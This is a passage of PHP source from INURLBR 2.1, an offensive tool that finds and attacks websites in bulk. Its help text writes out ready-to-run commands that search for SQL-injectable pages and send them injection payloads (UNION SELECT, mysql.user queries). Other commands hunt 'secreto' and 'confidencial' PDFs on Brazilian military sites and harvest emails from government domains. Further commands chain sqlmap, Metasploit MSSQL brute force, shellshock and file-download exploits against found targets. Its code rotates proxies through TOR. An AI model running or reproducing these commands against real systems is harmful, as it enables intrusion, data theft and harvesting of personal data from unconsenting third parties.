 {$_SESSION["c1"]}md5{$_SESSION["c0"]} Encrypt values in md5.
     Example: {$_SESSION["c1"]}md5({$_SESSION["c2"]}{value}{$_SESSION["c1"]}){$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}md5({$_SESSION["c2"]}102030{$_SESSION["c1"]}){$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}--exploit-get 'user?id=md5({$_SESSION["c2"]}102030{$_SESSION["c1"]})'{$_SESSION["c0"]}

 {$_SESSION["c1"]}base64{$_SESSION["c0"]} Encrypt values in base64.
     Example: {$_SESSION["c1"]}base64({$_SESSION["c2"]}{value}{$_SESSION["c1"]}){$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}base64({$_SESSION["c2"]}102030{$_SESSION["c1"]}){$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}--exploit-get 'user?id=base64({$_SESSION["c2"]}102030{$_SESSION["c1"]})'{$_SESSION["c0"]}
         
 {$_SESSION["c1"]}hex{$_SESSION["c0"]} Encrypt values in hex.
     Example: {$_SESSION["c1"]}hex({$_SESSION["c2"]}{value}{$_SESSION["c1"]}){$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}hex({$_SESSION["c2"]}102030{$_SESSION["c1"]}){$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}--exploit-get 'user?id=hex({$_SESSION["c2"]}102030{$_SESSION["c1"]})'{$_SESSION["c0"]}

 {$_SESSION["c1"]}hex{$_SESSION["c0"]} Generate random values.
     Example: {$_SESSION["c1"]}random({$_SESSION["c2"]}{character_counter}{$_SESSION["c1"]}){$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}random({$_SESSION["c2"]}8{$_SESSION["c1"]}){$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}--exploit-get 'user?id=random({$_SESSION["c2"]}8{$_SESSION["c1"]})'{$_SESSION["c0"]}

");
}

function __info() {

    return system("command clear") . __getOut("
 {$_SESSION["c1"]}_____ _   _ ______ ____  
|_   _| \ | |  ____/ __ \ 
  | | |  \| | |__ | |  | |
  | | | . ` |  __|| |  | |
 _| |_| |\  | |   | |__| |
|_____|_| \_|_|    \____/
 
{$_SESSION["c1"]}[ INFO ]{$_SESSION["c0"]}Current PHP version=>{$_SESSION["c1"]}[ " . phpversion() . "{$_SESSION["c0"]} ]
{$_SESSION["c1"]}[ INFO ]{$_SESSION["c0"]}Current script owner=>{$_SESSION["c1"]}[ " . get_current_user() . "{$_SESSION["c0"]} ]
{$_SESSION["c1"]}[ INFO ]{$_SESSION["c0"]}Current uname=>{$_SESSION["c1"]}[ " . php_uname() . "{$_SESSION["c0"]} ]
{$_SESSION["c1"]}[ INFO ]{$_SESSION["c0"]}Current pwd=>{$_SESSION["c1"]}[ " . getcwd() . "{$_SESSION["c0"]} ]
{$_SESSION["c1"]}[-]-------------------------------------------------------------------------------{$_SESSION["c0"]}
 
 {$_SESSION["c1"]}[*]{$_SESSION["c0"]}GRUPO  INURL BRASIL - PESQUISA AVANÇADA.
 {$_SESSION["c1"]}[*]{$_SESSION["c0"]}SCRIPT NAME: INURLBR 2.1
 {$_SESSION["c1"]}[*]{$_SESSION["c0"]}AUTOR:    Cleiton Pinheiro
 {$_SESSION["c1"]}[*]{$_SESSION["c0"]}Nick:     Googleinurl
 {$_SESSION["c1"]}[*]{$_SESSION["c0"]}Email:    inurlbr@gmail.com  
 {$_SESSION["c1"]}[*]{$_SESSION["c0"]}Blog:     http://blog.inurl.com.br
 {$_SESSION["c1"]}[*]{$_SESSION["c0"]}Twitter:  https://twitter.com/googleinurl
 {$_SESSION["c1"]}[*]{$_SESSION["c0"]}Facebook: https://fb.com/InurlBrasil
 {$_SESSION["c1"]}[*]{$_SESSION["c0"]}GIT:      https://github.com/googleinurl
 {$_SESSION["c1"]}[*]{$_SESSION["c0"]}Pastebin  https://pastebin.com/u/Googleinurl
 {$_SESSION["c1"]}[*]{$_SESSION["c0"]}PSS:      https://packetstormsecurity.com/user/googleinurl
 {$_SESSION["c1"]}[*]{$_SESSION["c0"]}YOUTUBE:  http://youtube.com/c/INURLBrasil
 {$_SESSION["c1"]}[*]{$_SESSION["c0"]}PLUS:     http://google.com/+INURLBrasil
 {$_SESSION["c1"]}[*]{$_SESSION["c0"]}Version:  2.1

{$_SESSION["c1"]}[-]-------------------------------------------------------------------------------{$_SESSION["c0"]}
 
   {$_SESSION["c1"]}[+]{$_SESSION["c16"]}NECESSARY FOR THE PROPER FUNCTIONING OF THE SCRIPT{$_SESSION["c0"]}
	
     {$_SESSION["c1"]}[ - ]{$_SESSION["c16"]} LIB & CONFIG{$_SESSION["c0"]}

 * PHP Version         5.4.7
 * php5-curl           LIB
 * php5-cli            LIB   
 * cURL support        enabled
 * cURL Information    7.24.0
 * allow_url_fopen     On
 * permission          Reading & Writing
 * User                root privilege, or is in the sudoers group
 * Operating system    LINUX
 * Proxy random        TOR 
                
{$_SESSION["c1"]}[-]-------------------------------------------------------------------------------{$_SESSION["c0"]}
 
   {$_SESSION["c1"]}[+]{$_SESSION["c0"]} {$_SESSION["c16"]}PERMISSION EXECUTION: chmod +x inurlbr.php{$_SESSION["c0"]}
   {$_SESSION["c1"]}[+]{$_SESSION["c0"]} {$_SESSION["c16"]}INSTALLING LIB PHP-CURL: sudo apt-get install php5-curl{$_SESSION["c0"]}
   {$_SESSION["c1"]}[+]{$_SESSION["c0"]} {$_SESSION["c16"]}INSTALLING LIB PHP-CLI: sudo apt-get install php5-cli{$_SESSION["c0"]}
   {$_SESSION["c1"]}[+]{$_SESSION["c0"]} {$_SESSION["c16"]}sudo apt-get install curl libcurl3 libcurl3-dev php5 php5-cli php5-curl033[0m
   {$_SESSION["c1"]}[+]{$_SESSION["c0"]} {$_SESSION["c16"]}INSTALLING PROXY TOR https://www.torproject.org/docs/debian.html.en{$_SESSION["c0"]}
   
{$_SESSION["c1"]}[-]-------------------------------------------------------------------------------{$_SESSION["c0"]}

     {$_SESSION["c1"]}[ - ]{$_SESSION["c16"]} COMMANDS SIMPLE SCRIPT{$_SESSION["c0"]}
   
   
./inurlbr.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'inurl:php?id=' {$_SESSION["c1"]}-s {$_SESSION["c2"]}save.txt {$_SESSION["c1"]}-q 1,6 {$_SESSION["c1"]}-t {$_SESSION["c2"]}1 {$_SESSION["c1"]}--exploit-get {$_SESSION["c3"]}\"?´'%270x27;\" {$_SESSION["c0"]} 
   
./inurlbr.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'inurl:aspx?id=' {$_SESSION["c1"]}-s {$_SESSION["c2"]}save.txt {$_SESSION["c1"]}-q 1,6 {$_SESSION["c1"]}-t {$_SESSION["c2"]}1 {$_SESSION["c1"]}--exploit-get {$_SESSION["c3"]}\"?´'%270x27;\" {$_SESSION["c0"]}
   
./inurlbr.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'site:br inurl:aspx (id|new)' {$_SESSION["c1"]}-s {$_SESSION["c2"]}save.txt {$_SESSION["c1"]}-q {$_SESSION["c2"]}1,6 {$_SESSION["c1"]}-t {$_SESSION["c2"]}1 {$_SESSION["c1"]}--exploit-get {$_SESSION["c3"]}\"?´'%270x27;\"{$_SESSION["c0"]}
   
./inurlbr.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'index of wp-content/uploads' {$_SESSION["c1"]}-s {$_SESSION["c2"]}save.txt {$_SESSION["c1"]}-q {$_SESSION["c2"]}1,6,2,4 {$_SESSION["c1"]}-t {$_SESSION["c2"]}2 {$_SESSION["c1"]}--exploit-get {$_SESSION["c3"]}'?' {$_SESSION["c1"]}-a {$_SESSION["c2"]}'Index of /wp-content/uploads'{$_SESSION["c0"]}
   
./inurlbr.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'site:.mil.br intext:(confidencial) ext:pdf' {$_SESSION["c1"]}-s {$_SESSION["c2"]}save.txt {$_SESSION["c1"]}-q 1,6 -t 2 --exploit-get {$_SESSION["c3"]}'?' {$_SESSION["c1"]}-a {$_SESSION["c2"]}'confidencial'{$_SESSION["c0"]}
   
./inurlbr.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'site:.mil.br intext:(secreto) ext:pdf' {$_SESSION["c1"]}-s save.txt {$_SESSION["c1"]}-q {$_SESSION["c2"]}1,6 {$_SESSION["c1"]}-t {$_SESSION["c2"]}2 {$_SESSION["c1"]}--exploit-get {$_SESSION["c2"]}'?' {$_SESSION["c1"]}-a {$_SESSION["c2"]}'secreto'{$_SESSION["c0"]}        
  
./inurlbr.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'site:br inurl:aspx (id|new)' {$_SESSION["c1"]}-s {$_SESSION["c2"]}save.txt {$_SESSION["c1"]}-q {$_SESSION["c2"]}1,6 {$_SESSION["c1"]}-t {$_SESSION["c2"]}1 {$_SESSION["c1"]}--exploit-get {$_SESSION["c2"]}\"?´'%270x27;\"{$_SESSION["c0"]}
   
./inurlbr.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'.new.php?new id' {$_SESSION["c1"]}-s {$_SESSION["c2"]}save.txt {$_SESSION["c1"]}-q 1,6,7,2,3 {$_SESSION["c1"]}-t {$_SESSION["c2"]}1 {$_SESSION["c1"]}--exploit-get {$_SESSION["c3"]}'+UNION+ALL+SELECT+1,concat(0x3A3A4558504C4F49542D5355434553533A3A,@@version),3,4,5;' {$_SESSION["c1"]}-a {$_SESSION["c2"]}'::EXPLOIT-SUCESS::'{$_SESSION["c0"]}
  
./inurlbr.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'new.php?id=' {$_SESSION["c1"]}-s {$_SESSION["c2"]}teste.txt  {$_SESSION["c1"]}--exploit-get {$_SESSION["c3"]}?´0x27  {$_SESSION["c1"]}--command-vul {$_SESSION["c2"]}'nmap sV -p 22,80,21 {$_SESSION["c8"]}_TARGET_{$_SESSION["c2"]}'{$_SESSION["c0"]}
   
./inurlbr.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'site:pt inurl:aspx (id|q)' {$_SESSION["c1"]}-s {$_SESSION["c2"]}bruteforce.txt {$_SESSION["c1"]}--exploit-get {$_SESSION["c3"]}?´0x27 {$_SESSION["c1"]}--command-vul {$_SESSION["c2"]}'msfcli auxiliary/scanner/mssql/mssql_login RHOST={$_SESSION["c9"]}_TARGETIP_ {$_SESSION["c2"]}MSSQL_USER=inurlbr MSSQL_PASS_FILE=/home/pedr0/Documentos/passwords E'{$_SESSION["c0"]}
  
./inurlbr.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'site:br inurl:id & inurl:php' {$_SESSION["c1"]}-s {$_SESSION["c2"]}get.txt {$_SESSION["c1"]}--exploit-get {$_SESSION["c3"]}\"?´'%270x27;\" {$_SESSION["c1"]}--command-vul {$_SESSION["c2"]}'python ../sqlmap/sqlmap.py -u \"{$_SESSION["c14"]}_TARGETFULL_{$_SESSION["c2"]}\" --dbs'{$_SESSION["c0"]}
  
./inurlbr.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'inurl:index.php?id=' {$_SESSION["c1"]}-q 1,2,10 {$_SESSION["c1"]}--exploit-get {$_SESSION["c3"]}\"'?´0x27'\" {$_SESSION["c1"]}-s {$_SESSION["c2"]}report.txt {$_SESSION["c1"]}--command-vul {$_SESSION["c2"]}'nmap -Pn -p 1-8080 --script http-enum --open {$_SESSION["c8"]}_TARGET_{$_SESSION["c2"]}'{$_SESSION["c0"]}
 
./inurlbr.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'site:.gov.br email' {$_SESSION["c1"]}-s {$_SESSION["c2"]}reg.txt -q 1  --regexp '([\w\d\.\-\_]+)@([\w\d\.\_\-]+)'{$_SESSION["c0"]}
  
./inurlbr.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'site:.gov.br email (gmail|yahoo|hotmail) ext:txt' {$_SESSION["c1"]}-s {$_SESSION["c2"]}emails.txt {$_SESSION["c1"]}-m{$_SESSION["c0"]}
  
./inurlbr.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'site:.gov.br email (gmail|yahoo|hotmail) ext:txt' {$_SESSION["c1"]}-s {$_SESSION["c2"]}urls.txt {$_SESSION["c1"]}-u{$_SESSION["c0"]}
 
./inurlbr.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'site:gov.bo' {$_SESSION["c1"]}-s {$_SESSION["c2"]}govs.txt {$_SESSION["c1"]}--exploit-all-id {$_SESSION["c2"]} 1,2,6 {$_SESSION["c0"]} 
 
./inurlbr.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'site:.uk' {$_SESSION["c1"]}-s {$_SESSION["c2"]}uk.txt {$_SESSION["c1"]}--user-agent {$_SESSION["c2"]} 'Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)' {$_SESSION["c0"]}
 
./inurlbr.php {$_SESSION["c1"]}--dork-file {$_SESSION["c2"]}'dorksSqli.txt' {$_SESSION["c1"]}-s {$_SESSION["c2"]}govs.txt {$_SESSION["c1"]}--exploit-all-id {$_SESSION["c2"]} 1,2,6 {$_SESSION["c0"]}
 
./inurlbr.php {$_SESSION["c1"]}--dork-file {$_SESSION["c2"]}'dorksSqli.txt' {$_SESSION["c1"]}-s {$_SESSION["c2"]}sqli.txt {$_SESSION["c1"]}--exploit-all-id {$_SESSION["c2"]} 1,2,6  {$_SESSION["c1"]}--irc {$_SESSION["c2"]}'irc.rizon.net#inurlbrasil'   {$_SESSION["c0"]}
  
./inurlbr.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'inurl:\"cgi-bin/login.cgi\"' {$_SESSION["c1"]}-s {$_SESSION["c2"]}cgi.txt --ifurl 'cgi' --command-all 'php xplCGI.php _TARGET_' {$_SESSION["c0"]} 
 
./inurlbr.php {$_SESSION["c1"]}--target {$_SESSION["c2"]}'http://target.com.br' {$_SESSION["c1"]}-o {$_SESSION["c2"]}cancat_file_urls_find.txt {$_SESSION["c1"]}-s {$_SESSION["c2"]}output.txt {$_SESSION["c1"]}-t {$_SESSION["c2"]}4{$_SESSION["c0"]}
  
./inurlbr.php {$_SESSION["c1"]}--target {$_SESSION["c2"]}'http://target.com.br' {$_SESSION["c1"]}-o {$_SESSION["c2"]}cancat_file_urls_find.txt {$_SESSION["c1"]}-s {$_SESSION["c2"]}output.txt {$_SESSION["c1"]}-t {$_SESSION["c2"]}4{$_SESSION["c0"]} {$_SESSION["c1"]}--exploit-get {$_SESSION["c3"]}\"?´'%270x27;\"{$_SESSION["c0"]}
  
./inurlbr.php {$_SESSION["c1"]}--target {$_SESSION["c2"]}'http://target.com.br' {$_SESSION["c1"]}-o {$_SESSION["c2"]}cancat_file_urls_find.txt {$_SESSION["c1"]}-s {$_SESSION["c2"]}output.txt {$_SESSION["c1"]}-t {$_SESSION["c2"]}4{$_SESSION["c0"]} {$_SESSION["c1"]}--exploit-get {$_SESSION["c3"]}\"?pass=1234\" {$_SESSION["c1"]}-a {$_SESSION["c2"]}'<title>hello! admin</title>'{$_SESSION["c0"]}
  
./inurlbr.php {$_SESSION["c1"]}--target {$_SESSION["c2"]}'http://target.com.br' {$_SESSION["c1"]}-o {$_SESSION["c2"]}cancat_file_urls_find_valid_cod-200.txt {$_SESSION["c1"]}-s {$_SESSION["c2"]}output.txt {$_SESSION["c1"]}-t {$_SESSION["c2"]}5{$_SESSION["c0"]}
  
./inurlbr.php {$_SESSION["c1"]}--range {$_SESSION["c2"]}'200.20.10.1,200.20.10.255' {$_SESSION["c1"]}-s {$_SESSION["c2"]}output.txt {$_SESSION["c1"]}--command-all {$_SESSION["c2"]}'php roteador.php _TARGETIP_'  {$_SESSION["c0"]}
 
./inurlbr.php {$_SESSION["c1"]}--range-rad {$_SESSION["c2"]}'1500' {$_SESSION["c1"]}-s {$_SESSION["c2"]}output.txt {$_SESSION["c1"]}--command-all {$_SESSION["c2"]}'php roteador.php _TARGETIP_'  {$_SESSION["c0"]}
 
./inurlbr.php {$_SESSION["c1"]}--dork-rad {$_SESSION["c2"]}'20' {$_SESSION["c1"]}-s {$_SESSION["c2"]}output.txt {$_SESSION["c1"]}--exploit-get {$_SESSION["c2"]}\"?´'%270x27;\" {$_SESSION["c1"]}-q {$_SESSION["c2"]}1,2,6,4,5,9,7,8  {$_SESSION["c0"]}
 
./inurlbr.php {$_SESSION["c1"]}--dork-rad {$_SESSION["c2"]}'20' {$_SESSION["c1"]}-s {$_SESSION["c2"]}output.txt {$_SESSION["c1"]}--exploit-get {$_SESSION["c2"]}\"?´'%270x27;\" {$_SESSION["c1"]}-q {$_SESSION["c2"]}1,2,6,4,5,9,7,8  {$_SESSION["c0"]} --pr
 
./inurlbr.php {$_SESSION["c1"]}--dork-file {$_SESSION["c2"]}'dorksCGI.txt' {$_SESSION["c1"]}-s {$_SESSION["c2"]}output.txt {$_SESSION["c1"]}-q {$_SESSION["c2"]}1,2,6,4,5,9,7,8  {$_SESSION["c0"]} --pr --shellshock
 
./inurlbr.php {$_SESSION["c1"]}--dork-file {$_SESSION["c2"]}'dorks_Wordpress_revslider.txt' {$_SESSION["c1"]}-s {$_SESSION["c2"]}output.txt {$_SESSION["c1"]}-q {$_SESSION["c2"]}1,2,6,4,5,9,7,8  {$_SESSION["c1"]}--sub-file {$_SESSION["c2"]}'xpls_Arbitrary_File_Download.txt' {$_SESSION["c0"]} 
   {$_SESSION["c1"]}[-]-------------------------------------------------------------------------------{$_SESSION["c0"]}
  
  {$_SESSION["c1"]}[ INFO ]{$_SESSION["c16"]}It it also useful to know the full path to the PHP binary on your computer. {$_SESSION["c0"]}
  {$_SESSION["c1"]}[ INFO ]{$_SESSION["c16"]}There are several ways of finding out. For Ubuntu and Mac OS X the path is '/usr/bin/php'.{$_SESSION["c0"]}

  googleinurl@inurlbr:~$ which php 
  /usr/bin/php 
  googleinurl@inurlbr:~/cli$ whereis php 
  php: /usr/bin/php /usr/share/php /usr/share/man/man1/php.1.gz 
  googleinurl@inurlbr:~/cli$ type -a php 
  php is /usr/bin/php

{$_SESSION["c1"]}[-]-------------------------------------------------------------------------------{$_SESSION["c0"]}


");
}

################################################################################
#BANNER HOME####################################################################

function __bannerLogo() {

    $vis = ($_SESSION["os"] != 1) ? ("\033[1;3" . rand(1, 10) . "m") : NULL;

    return (!is_null($_SESSION['config']['no-banner']) ? NULL : system("command clear") . "
{$vis}    _____ {$_SESSION["c1"]} .701F. .iBR.   .7CL. .70BR.   .7BR. .7BR'''Cq.   .70BR.      {$_SESSION["c12"]}.1BR'''Yp, .8BR'''Cq.  
{$vis}   (_____){$_SESSION["c1"]}   01     01N.    C     01       C     01   .01.    01        {$_SESSION["c3"]}  01    Yb   01   .01. 
{$vis}   (() ()){$_SESSION["c1"]}   01     C YCb   C     01       C     01   ,C9     01        {$_SESSION["c12"]}  01    dP   01   ,C9  
{$vis}    \   / {$_SESSION["c1"]}   01     C  .CN. C     01       C     0101dC9      01        {$_SESSION["c3"]}  01'''bg.   0101dC9   
{$vis}     \ /  {$_SESSION["c1"]}   01     C   .01.C     01       C     01  YC.      01      , {$_SESSION["c12"]}  01    .Y   01  YC.   
{$vis}     /=\  {$_SESSION["c1"]}   01     C     Y01     YC.     ,C     01   .Cb.    01     ,C {$_SESSION["c3"]}  01    ,9   01   .Cb. 
{$vis}    [___] {$_SESSION["c1"]} .J01L. .JCL.    YC      .b0101d'.   .J01L. .J01. .J01010101C {$_SESSION["c12"]}.J0101Cd9  .J01L. .J01./ {$_SESSION["c1"]}2.1\n
{$_SESSION["c1"]}__[ ! ] Neither war between hackers, nor peace for the system.
{$_SESSION["c1"]}__[ ! ] {$_SESSION["c16"]}http://blog.inurl.com.br
{$_SESSION["c1"]}__[ ! ] {$_SESSION["c16"]}http://fb.com/InurlBrasil
{$_SESSION["c1"]}__[ ! ] {$_SESSION["c16"]}http://twitter.com/@googleinurl{$_SESSION["c0"]}
{$_SESSION["c1"]}__[ ! ] {$_SESSION["c16"]}http://github.com/googleinurl{$_SESSION["c0"]}
{$_SESSION["c1"]}__[ ! ] {$_SESSION["c16"]}Current PHP version::[ {$_SESSION["c1"]}" . phpversion() . " {$_SESSION["c16"]}]{$_SESSION["c0"]}
{$_SESSION["c1"]}__[ ! ] {$_SESSION["c16"]}Current script owner::[ {$_SESSION["c1"]}" . get_current_user() . " {$_SESSION["c16"]}]{$_SESSION["c0"]}
{$_SESSION["c1"]}__[ ! ] {$_SESSION["c16"]}Current uname::[ {$_SESSION["c1"]}" . php_uname() . " {$_SESSION["c16"]}]{$_SESSION["c0"]}
{$_SESSION["c1"]}__[ ! ] {$_SESSION["c16"]}Current pwd::[ {$_SESSION["c1"]}" . getcwd() . " {$_SESSION["c16"]}]{$_SESSION["c0"]}
{$_SESSION["c1"]}__[ ! ] {$_SESSION["c2"]}Help: php inurlbr.php --help{$_SESSION["c0"]}
{$_SESSION["c1"]}------------------------------------------------------------------------------------------------------------------------{$_SESSION["c0"]}
");
}

################################################################################
#CHANGE PROXY FUNCTION IN TIME##################################################
################################################################################

function __timeValueChangeProxy($sec = NULL) {

    return not_isnull_empty($sec) ? date('Y-m-d H:i:s', strtotime(date('Y-m-d H:i:s') . " + {$sec} second")) : NULL;
}

function __timeSecChangeProxy($list_proxy) {

    if ($_SESSION["config"]["time_change_proxy"] < date('Y-m-d H:i:s') && !is_null($list_proxy)) {
        $proxy = $list_proxy[rand(0, count($list_proxy) - 1)];
        echo ("[ INFO ][PROXY] CHANGE: {$proxy}  - " . date('Y-m-d H:i:s') . "\n");
        $_SESSION["config"]["proxy"] = $proxy;
        $_SESSION["config"]["time_change_proxy"] = __timeValueChangeProxy($_SESSION["config"]["time-proxy"]);
        __plus();
    }
}

################################################################################
#GET STATUS HTTP URL############################################################
################################################################################

function __getStatusURL($url) {

    if (!is_null($url) && !empty($url)) {
        return FALSE;
    }
    __plus();
    $status = array();
    $curl = curl_init($url);
    curl_setopt($curl, CURLOPT_URL, $url);
    $resultadoCurl = curl_exec($curl);
    if ($resultadoCurl) {
        preg_match_all('(HTTP.*)', $resultadoCurl, $status['http']) . __plus();

        return (!is_null($status['http']) && !empty($status['http'])) ? TRUE : FALSE;
    }
    unset($curl);
    return FALSE;
}

################################################################################
#BEEP ##########################################################################
################################################################################

function __cli_beep() {

    echo ($_SESSION['config']['beep']) ? "\x07" : NULL;
}

################################################################################
#SETUP TO RUN COMMANDS IN ID####################################################
################################################################################

function __configExploitsExec($id, $alvo) {

    $resultadoURL = __configExploitsList();
    $final = array();
    $id_ = ((strstr($id, ','))) ? explode(',', $id) : array($id); // MULTIPLAS ID'S EXPLOITS

    foreach ($resultadoURL as $key) {
        $__key = strstr($key, '::') ? explode("\n", $key) : NULL;
        $final = is_array($__key) ? array_merge($final, $__key) : $final;
    }
    foreach ($id_ as $value) {
        $final__ = isset($value) && !empty($value) ? explode('::', $final[$value]) : NULL;
        $barra = "{$_SESSION["c1"]}[ INFO ]|___{$_SESSION["c0"]}\n";
        $barra.= "      {$_SESSION["c1"]}|";
        print !is_null($final__) ? "\n{$barra}[ EXPLOIT ]:: {$final__[0]} /[ ID ]:: {$value} /[ COMMAND ]:: " . $final__[1] : NULL;
        echo "\n      ------------------------------------------------------------------------------------------------------------------";
        print !is_null($final__) ? __command($final__[1], $alvo) : NULL;
        __plus();
    }
}

################################################################################
#LIST COMMANDS FILE exploits.conf###############################################
################################################################################

function __configExploitsList($op = NULL) {

    $resultadoURL = array_unique(array_filter(explode("\n", file_get_contents($_SESSION['config']['file_exploit_conf']))));

    if (!is_null($op)) {
        echo __bannerlogo();
        echo $_SESSION["c11"];
        echo "[*]__\n";
        echo "     |MENU EXPLOITS:";
        echo "\n     |ID TYPE_EXPLOIT::EXPLOIT_COMMAND";
        echo "\n     |FILE CONFIG: {$_SESSION['config']['file_exploit_conf']}";
        echo "\n     |USE COMMAND EX: --exploit-id '1,2,3,19'";
        echo "\n-----------------------------------------------------------------------------------------------------------------------\n";
        print_r($resultadoURL);
        __getOut("{$_SESSION['config']['line']}\n");
    } else {
        return is_array($resultadoURL) ? $resultadoURL : NULL;
    }
}

################################################################################
#INSERT VALUES COMMANDS FILE exploits.conf######################################
################################################################################

function __configExploitsADD($valor = NULL) {

    if (!is_null($valor) && preg_match("(([a-zA-Z0-9-].*)(::.*)([a-zA-Z0-9-]))", $valor)) {
        echo __bannerlogo();
        echo $_SESSION["c11"];
        echo "[*]__\n";
        echo "     |MENU EXPLOITS:";
        echo "\n     |ID TYPE_EXPLOIT::EXPLOIT_COMMAND";
        echo "\n     |STATUS: ADDED VALUE WITH SUCCESS!";
        echo "\n     |VALUE: {$valor}";
        echo "\n-----------------------------------------------------------------------------------------------------------------------\n";
        __saveValue($_SESSION['config']['file_exploit_conf'], __crypt($valor), 2);
        print_r(__configExploitsList());
        __getOut("{$_SESSION['config']['line']}\n");
    } else {

        __getOut(__bannerLogo() . "{$_SESSION["c1"]}[ INFO ]{$_SESSION["c0"]}{$_SESSION["c2"]}INCORRECT FORMAT! / Format TYPE_EXPLOIT::EXPLOIT_COMMAND / ex: NMAP::nmap -sV _TARGET_\n");
    }
}

################################################################################
#CHECK CMS######################################################################
################################################################################

function __SimpleCheckCMS($html) {

    $cms['XOOPS CMS IDENTIFIED'] = '<meta name="generator" content="XOOPS"';
    $cms['Joomla CMS IDENTIFIED'] = '<meta name="generator" content="Joomla!';
    $cms['Wordpress CMS IDENTIFIED'] = '<meta name="generator" content="WordPress';
    $cms['SMF CMS IDENTIFIED-1'] = '<a href="http://www.simplemachines.org/" title="Simple Machines Forum" target="_blank">Powered by SMF';
    $cms['SMF CMS IDENTIFIED-2'] = '<a href="http://www.simplemachines.org/about/copyright.php" title="Free Forum Software" target="_blank">SMF';
    $cms['vBulletin CMS IDENTIFIED-1'] = '<meta name="generator" content="vBulletin';
    $cms['vBulletin CMS IDENTIFIED-2'] = 'Powered by <a href="http://www.vbulletin.com" id="vbulletinlink">vBulletin&trade;</a> Version';
    $cms['vBulletin CMS IDENTIFIED-3'] = 'powered by vBulletin';
    $cms['phpBB CMS IDENTIFIED'] = 'Powered by <a href="http://www.phpbb.com/">phpBB</a>';
    $cms['MyBB CMS IDENTIFIED'] = 'Powered By <a href="http://www.mybboard.net" target="_blank">MyBB</a>';
    $cms['Drupal CMS IDENTIFIED-1'] = 'name="Generator" content="Drupal';
    $cms['Drupal CMS IDENTIFIED-2'] = 'Drupal.settings';
    $cms['MODx CMS IDENTIFIED'] = '<a href="http://www.modx.com" target="_blank"> Powered by MODx</a>';
    $cms['SilverStripe CMS IDENTIFIED'] = '<meta name="generator" content="SilverStripe - http://silverstripe.org" />';
    $cms['Textpattern CMS IDENTIFIED'] = 'Powered by <a href="http://www.textpattern.com" title="Textpattern">Textpattern</a>';
    $cms['Adapt CMS IDENTIFIED'] = 'Powered by <a href="http://www.adaptcms.com">AdaptCMS';
    $cms['ATutor CMS IDENTIFIED'] = '<a href="/about.php">About ATutor</a>';
    $cms['b2evolution CMS IDENTIFIED'] = '<meta name="generator" content="b2evolution';
    $cms['Moodle CMS IDENTIFIED-1'] = 'Powered by <a href="http://moodle.org" title="Moodle">Moodle</a>';
    $cms['Moodle CMS IDENTIFIED-2 '] = '<meta name="key words" content="moodle, Course Management System " />';
    $cms['Moodle CMS IDENTIFIED-3'] = '://moodle';
    $cms['Moodle CMS IDENTIFIED-4'] = '://www.mood le';
    $cms['ATutor CMS IDENTIFIED'] = '<META NAME="GENERATOR" CONTENT="PHP-Nuke';
    $cms['PostNuke CMS IDENTIFIED'] = '<meta name="generator" content="PostNuke';
    $cms['CloudFlare IDENTIFIED-1'] = '<a href="http://www.cloudflare.com/" target="_blank" style=';
    $cms['CloudFlare IDENTIFIED-2'] = 'DDoS protection by CloudFlare</a>';

    foreach ($cms as $campo => $valor) {

        __plus();
        if (strstr($html, $cms[$campo])) {
            return(" {$campo} ");
        }
    }
    return "0xUNIDENTIFIED";
}

################################################################################
#REPLACE THE SECURITIES URL#####################################################
################################################################################

function __replace($exploit, $url) {

    $exploit_ = strstr($_SESSION['config']['replace'], '[INURL]') ?
            $exploit :
            __getOut(__bannerLogo() . "{$_SESSION["c1"]}[ INFO ]{$_SESSION["c0"]}{$_SESSION["c16"]}DEFINE THE CORRECT REPLACE COMMAND ex: --replace 'index.php?id=[INURL]index.php?id=1666+and+(SELECT+user+from+mysql.user+limit+0,1)=1'{$_SESSION["c0"]}\n");
    $exploit = explode("[INURL]", $exploit_);
    $exploit[0] = (isset($exploit[0]) && !is_null($exploit[0])) ?
            $exploit[0] :
            __getOut(__bannerLogo() . "{$_SESSION["c1"]}[ INFO ]{$_SESSION["c0"]}{$_SESSION["c16"]}DEFINE THE CORRECT REPLACE COMMAND ex: --replace 'index.php?id=[INURL]index.php?id=1666+and+(SELECT+user+from+mysql.user+limit+0,1)=1'{$_SESSION["c0"]}\n");
    $exploit[1] = (isset($exploit[0]) && !is_null($exploit[1])) ?
            $exploit[1] :
            __getOut(__bannerLogo() . "{$_SESSION["c1"]}[ INFO ]{$_SESSION["c0"]}{$_SESSION["c16"]}DEFINE THE CORRECT REPLACE COMMAND ex: --replace 'index.php?id=[INURL]index.php?id=1666+and+(SELECT+user+from+mysql.user+limit+0,1)=1'{$_SESSION["c0"]}\n");
    return str_replace($exploit[0], $exploit[1], $url);
}

################################################################################
#REMOVE VALUE URL###############################################################
################################################################################

function __remove($value, $url) {

    return str_replace($value, NULL, $url);
}

################################################################################
#VALID MENU OPTIONS#############################################################
################################################################################

function __validateOptions($opArray, $validar, $op = NULL) {

    if (empty($validar) || empty($opArray)) {
        return FALSE;
    }

    $array = explode(',', $opArray);
    if (is_null($op)) {
